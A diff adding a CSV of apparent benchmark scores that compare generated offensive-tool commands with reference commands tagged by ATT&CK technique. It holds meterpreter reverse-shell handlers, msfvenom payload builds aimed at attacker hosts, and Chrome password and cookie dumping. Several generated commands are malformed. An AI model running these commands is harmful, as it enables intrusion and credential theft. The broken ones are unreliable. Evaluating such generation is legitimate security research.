@@ -1,0 +1,27 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_chrome_passwords_TA0009_T1185.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",46.422,True
+command_chrome_passwords_TA0009_T1185.txt,chrome passwords,chrome-passwords -c > cookies_output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",38.996,True
+command_chrome_passwords_TA0009_T1185.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",46.422,True
+command_chrome_passwords_TA0009_T1185.txt,chrome passwords,chrome-passwords -c > cookies_output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",38.996,True
+command_metasploit_TA0002_T1203.txt,metasploit,"msfconsole -x ""use exploit/windows/fileformat/ms03_026"" -x ""set payload windows/meterpreter/reverse_tcp"" -x ""set RHOST <target_ip>"" -x ""set RPORT 445"" -x ""exploit""","```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",42.009,True
+command_metasploit_TA0011_T1105.txt,metasploit,browser_exploit_server -z <default_target> -v -c --payload <initial_downloader_payload>," ```
+    set payload windows/x64/meterpreter_reverse_https
+    set lport 80
+    set ExitOnSession False
+    exploit -j
+```",22.085,True
+command_metasploit_TA0011_T1105.txt,metasploit,get_payload -z <default_target> --payload <initial_downloader_payload>," ```
+    set payload windows/x64/meterpreter_reverse_https
+    set lport 80
+    set ExitOnSession False
+    exploit -j
+```",16.558,True
+command_metasploit_TA0011_T1105.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp <initial_downloader Payload> LHOST=<attacker_ip> LPORT=<attacker_port>,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,51.889,True
+command_metasploit_TA0011_T1105.txt,metasploit,"msfconsole -x ""use exploit/multi/http/cobalt_beacon; set <attacker_ip> LHOST=<attacker_ip>; set <attacker_port> LPORT=<attacker_port>; execute"" --nolog",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,23.084,True
